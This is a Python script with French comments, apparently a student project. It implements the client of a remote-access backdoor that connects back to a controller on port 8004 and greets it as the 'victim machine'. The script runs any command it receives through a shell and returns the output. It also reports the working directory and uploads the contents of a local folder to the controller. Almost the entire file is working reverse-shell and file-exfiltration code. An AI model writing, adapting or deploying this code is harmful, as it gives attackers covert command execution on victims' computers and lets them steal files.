import socket , os
import subprocess 
from time import sleep
import json 
from urllib import request
from os import walk
SIZE = 1024
FORMAT = "utf"
CLIENT_FOLDER = "client_folder"



"""-------------------création du socket coté client-----------------------------------------------"""

IP = socket.gethostbyname("localhost")
PORT = 8004

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP, int(PORT)))

#envoyer "start" au serveur
client_socket.send("start !".encode())


"""----------------------------------------------------classe client------------------------------------------------------------"""

class Client:
    def __init__(self, DATA):
        self.DATA = DATA

    """--------------fonction verif----------------"""
    
    def verifications(DATA):
        if(DATA == str.encode("command")):
            command = client_socket.recv(1024)
            Client.command(command.decode("utf-8"))
        if(DATA == str.encode("home")):
            client_socket.send(os.getcwd().encode())
        if(DATA == str.encode("exit")):
            client_socket.close()
            exit()
        if(DATA == str.encode("filesend")):
            Client.send_archive(DATA)
    
    """---------------fonction commande------------------"""
   
    def command(DATA):
        sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = sub.stderr.read()+sub.stdout.read()
        client_socket.send(output)
    
    """---------------fonction send_archive------------------"""

    def send_archive(DATA) :
        """ Folder path """
        path = path = os.path.join(CLIENT_FOLDER, "files")
        folder_name = path.split("/")[-1]

        """ Sending the folder name """
        msg = f"{folder_name}"
        
        client_socket.send(msg.encode(FORMAT))

        """ Receiving the reply from the server """
        msg = client_socket.recv(SIZE).decode(FORMAT)
        

        """ Sending files """
        files = sorted(os.listdir(path))

        for file_name in files:
            """ Send the file name """
            msg = f"FILENAME:{file_name}"
            client_socket.send(msg.encode(FORMAT))

            """ Recv the reply from the server """
            msg = client_socket.recv(SIZE).decode(FORMAT)

            """ Send the data """
            file = open(os.path.join(path, file_name), "r")
            file_data = file.read()

            msg = f"DATA:{file_data}"
            client_socket.send(msg.encode(FORMAT))
            msg = client_socket.recv(SIZE).decode(FORMAT)
            

            """ Sending the close command """
            msg = f"FINISH:Complete data send"
            client_socket.send(msg.encode(FORMAT))
            msg = client_socket.recv(SIZE).decode(FORMAT)
            



    """---------------------------------------------------------"""         
    

client_socket.send(str.encode(f"Bienvenue dans la machine victime ! \nI`m {IP}\n\n"))


while True:
    try:
        rcvc = client_socket.recv(1024)
        Client.verifications(rcvc)
    except KeyboardInterrupt:
        client_socket.close()
        exit()